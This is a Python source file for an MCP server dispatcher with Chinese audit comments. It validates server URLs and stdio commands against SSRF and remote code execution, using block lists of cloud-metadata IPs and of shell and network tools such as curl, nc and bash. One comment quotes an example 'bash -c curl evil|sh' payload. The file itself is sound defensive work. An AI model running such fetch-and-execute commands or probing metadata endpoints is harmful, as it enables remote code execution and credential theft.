"""MCP dispatcher — register/discover inbound Model Context Protocol servers.

Importers: dispatchers/__init__.py, daemon_server.py (_init_sub_dispatchers)
API: mcp.register_server, mcp.list_servers, mcp.unregister_server,
     mcp.list_resources, mcp.list_prompts
"""

from __future__ import annotations

import logging
import os
from collections.abc import Callable
from urllib.parse import urlparse

from .base import SubDispatcher

logger = logging.getLogger(__name__)

# 审计 E-5: MCP register_server 原连任意 URL + 起任意 stdio 命令无校验 = RCE/SSRF 汇.
# 默认拒云元数据 IP (169.254.169.254 link-local) + 明显内网探测目标, 允许
# localhost (本地 MCP 服务). FUSION_MCP_ALLOWLIST=host1,host2 限死可连主机 (逗号
# 分隔, 设了则只放行该集合). stdio 命令挡 shell 直连 (sh -c / bash -c) + 网络拉
# 取 (curl/wget), 防 stdio_cmd=["bash","-c","curl evil|sh"] RCE.
_METADATA_IPS = ("169.254.169.254", "169.254.170.2", "100.100.100.200")
_SSRF_BLOCK_HOSTS = ("metadata.google.internal", "metadata.aws.internal")
_DANGEROUS_STDIO = (
    "curl", "wget", "nc", "ncat", "bash", "sh", "zsh", "python", "python3",
    "perl", "ruby", "node", "php",
)


def _mcp_validate_server(server_url: str, stdio_cmd) -> str | None:
    # 返回拒绝原因 str, None = 放行. 审计 E-5: 默认 deny 非 localhost (本地 MCP 服务
    # 场景), 连远程须显式 FUSION_MCP_ALLOWLIST=host1,host2 (闭集). 再挡元数据 IP/SSRF.
    allow_raw = os.environ.get("FUSION_MCP_ALLOWLIST", "").strip()
    if server_url:
        host = (urlparse(server_url).hostname or "").lower()
        if host in _METADATA_IPS or host in _SSRF_BLOCK_HOSTS:
            return f"host '{host}' is a cloud-metadata/SSRF target, blocked"
        if allow_raw:
            allowed = {h.strip().lower() for h in allow_raw.split(",") if h.strip()}
            if host and host not in allowed:
                return f"host '{host}' not in FUSION_MCP_ALLOWLIST"
        else:
            # 无 allowlist: 仅放行 localhost 系 (本地 MCP), 远程需显式 allowlist.
            if host not in ("", "localhost", "127.0.0.1", "::1", "[::1]"):
                return (
                    f"host '{host}' not localhost; set FUSION_MCP_ALLOWLIST to "
                    f"allow remote MCP servers"
                )
    if allow_raw and stdio_cmd and not server_url:
        # stdio 无 URL host, allowlist 模式下 stdio 需显式允许 (cmd[0]).
        allowed = {h.strip().lower() for h in allow_raw.split(",") if h.strip()}
        cmd0 = str(stdio_cmd[0]).lower() if stdio_cmd else ""
        if cmd0 not in allowed:
            return f"stdio cmd '{cmd0}' not in FUSION_MCP_ALLOWLIST"
    if stdio_cmd:
        cmd0 = str(stdio_cmd[0]).lower() if stdio_cmd else ""
        if cmd0 in _DANGEROUS_STDIO:
            return (
                f"stdio cmd '{cmd0}' is a shell/network interpreter, blocked "
                f"(use a direct binary path; sh -c/curl|sh is an RCE vector)"
            )
    return None


class McpDispatcher(SubDispatcher):
    def get_handlers(self) -> dict[str, Callable]:
        return {
            "mcp.register_server": self._handle_register_server,
            "mcp.list_servers": self._handle_list_servers,
            "mcp.unregister_server": self._handle_unregister_server,
            "mcp.list_resources": self._handle_list_resources,
            "mcp.list_prompts": self._handle_list_prompts,
        }

    def _get_mcp_registry(self):
        """Lazily create + cache an MCPRegistry on the daemon, bound to the runtime tool registry."""
        from tools import create_default_registry
        from tools.mcp_tool import MCPRegistry

        registry = self._daemon._get_runtime().tool_registry
        if registry is None:
            registry = create_default_registry()
            self._daemon._get_runtime().tool_registry = registry

        mcp_reg = getattr(self._daemon, "_mcp_registry", None)
        if mcp_reg is None or getattr(mcp_reg, "_registry", None) is not registry:
            mcp_reg = MCPRegistry(registry)
            self._daemon._mcp_registry = mcp_reg
            logger.info("MCP registry initialized on daemon")
        return mcp_reg

    async def _handle_register_server(self, params: dict) -> dict:
        # 审计 E-5: 校验 server_url/stdio_cmd, 挡元数据 IP + shell/网络 RCE 向量.
        server_url = params.get("server_url") or params.get("sse_url") or params.get("post_url")
        stdio_cmd = params.get("stdio_cmd")
        reason = _mcp_validate_server(server_url or "", stdio_cmd)
        if reason:
            logger.warning("mcp.register_server blocked: %s", reason)
            return self._err(f"blocked by MCP safety policy: {reason}")
        mcp_reg = self._get_mcp_registry()
        try:
            registered = await mcp_reg.register_server(
                server_url=params.get("server_url"),
                headers=params.get("headers"),
                tool_filter=params.get("tool_filter"),
                stdio_cmd=params.get("stdio_cmd"),
                sse_url=params.get("sse_url"),
                post_url=params.get("post_url"),
                env=params.get("env"),
            )
            logger.info("mcp.register_server: registered %d tool(s)", len(registered))
            return {"registered": registered, "count": len(registered)}
        except (ValueError, TypeError, OSError, RuntimeError) as e:
            logger.error("mcp.register_server failed: %s", e)
            return self._err(str(e))

    async def _handle_list_servers(self, params: dict) -> dict:
        mcp_reg = self._get_mcp_registry()
        servers = mcp_reg.list_servers()
        return {"servers": servers, "count": len(servers)}

    async def _handle_unregister_server(self, params: dict) -> dict:
        mcp_reg = self._get_mcp_registry()
        server_url = params.get("server_url", "")
        if not server_url:
            return self._err("server_url is required")
        mcp_reg.unregister_server(server_url)
        logger.info("mcp.unregister_server: %s", server_url)
        return {"status": "ok", "unregistered": server_url}

    async def _handle_list_resources(self, params: dict) -> dict:
        from tools.mcp_tool import MCPRegistry

        mcp_reg = self._get_mcp_registry()
        server_url = params.get("server_url", "")
        servers = mcp_reg.list_servers()
        # 审计 E-5: 只对已注册 server 建传输, 挡未注册任意 URL (SSRF 放大器).
        if server_url:
            if server_url not in servers:
                logger.warning("mcp.list_resources blocked: server_url not registered")
                return self._err("server_url is not registered; register first via mcp.register_server")
            target_key = server_url
        else:
            target_key = next(iter(servers), "")
        if not target_key:
            return {"resources": [], "count": 0}

        transport = MCPRegistry._build_transport(server_url=target_key)
        if transport is None:
            return self._err("could not build transport for server")
        try:
            resources = await transport.list_resources()
            return {"resources": resources, "count": len(resources)}
        except (ValueError, TypeError, OSError, RuntimeError) as e:
            logger.error("mcp.list_resources failed: %s", e)
            return self._err(str(e))
        finally:
            await transport.close()

    async def _handle_list_prompts(self, params: dict) -> dict:
        from tools.mcp_tool import MCPRegistry

        mcp_reg = self._get_mcp_registry()
        server_url = params.get("server_url", "")
        servers = mcp_reg.list_servers()
        # 审计 E-5: 只对已注册 server 建传输, 挡未注册任意 URL (SSRF 放大器).
        if server_url:
            if server_url not in servers:
                logger.warning("mcp.list_prompts blocked: server_url not registered")
                return self._err("server_url is not registered; register first via mcp.register_server")
            target_key = server_url
        else:
            target_key = next(iter(servers), "")
        if not target_key:
            return {"prompts": [], "count": 0}

        transport = MCPRegistry._build_transport(server_url=target_key)
        if transport is None:
            return self._err("could not build transport for server")
        try:
            prompts = await transport.list_prompts()
            return {"prompts": prompts, "count": len(prompts)}
        except (ValueError, TypeError, OSError, RuntimeError) as e:
            logger.error("mcp.list_prompts failed: %s", e)
            return self._err(str(e))
        finally:
            await transport.close()
